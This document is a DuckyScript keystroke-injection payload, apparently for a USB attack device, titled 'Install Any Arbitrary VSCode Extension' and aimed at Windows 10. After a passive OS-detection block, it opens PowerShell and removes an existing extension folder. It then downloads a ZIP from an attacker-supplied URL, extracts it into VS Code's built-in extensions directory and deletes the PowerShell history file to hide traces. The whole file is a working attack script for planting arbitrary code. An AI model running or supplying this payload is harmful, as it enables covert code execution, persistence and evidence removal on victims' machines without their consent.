REM_BLOCK
##########################################################
#                                                        #
# Title        : Install Any Arbitrary VSCode Extension  #
# Author       : Aleff                                   #
# Version      : 1.0                                     #
# Category     : Execution                               #
# Target       : Windows 10                              #
#                                                        #
##########################################################
END_REM

REM Replace "example" with the name of the extension folder
DEFINE #EXTENSION_NAME example

REM Replace "https://example.com/path/to/archive.zip" with your own ZIP Archive link
DEFINE #ARCHIVE_LINK https://example.com/path/to/archive.zip

EXTENSION PASSIVE_WINDOWS_DETECT
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        Windows fully passive OS Detection and passive Detect Ready
        Includes its own passive detect ready.
        Does not require additional extensions.

        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay
            $_OS will be set to WINDOWS or NOT_WINDOWS
            See end of payload for usage within payload
    END_REM

    REM CONFIGURATION:
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7

    $_OS = #NOT_WINDOWS

    VAR $MAX_TRIES = #MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF

    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
        IF ($_OS == WINDOWS) THEN
            STRING HELLO WINDOWS!
        ELSE
            STRING HELLO WORLD!
        END_IF
    END_REM
END_EXTENSION

GUI r
DELAY 1000
STRINGLN PowerShell
DELAY 1000

STRINGLN_POWERSHELL
    $extensionsPath = "$env:USERPROFILE\AppData\Local\Programs\Microsoft VS Code\resources\app\extensions\#EXTENSION_NAME"

    if (Test-Path -Path $extensionsPath -PathType Container) {
        Remove-Item -Recurse -Force -Path $extensionsPath
    }
END_STRINGLN

REM May it depends by the extension...
DELAY 2000

STRINGLN_POWERSHELL
    $url = "#ARCHIVE_LINK"
    $downloadPath = "$env:TEMP\#EXTENSION_NAME.zip"
    $extractPath = "$env:USERPROFILE\AppData\Local\Programs\Microsoft VS Code\resources\app\extensions\#EXTENSION_NAME"
    Invoke-WebRequest -Uri $url -OutFile $downloadPath
    if (Test-Path -Path $downloadPath) {
        Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
        Remove-Item -Path $downloadPath -Force
        Remove-Item (Get-PSReadlineOption).HistorySavePath; exit
    }
END_STRINGLN
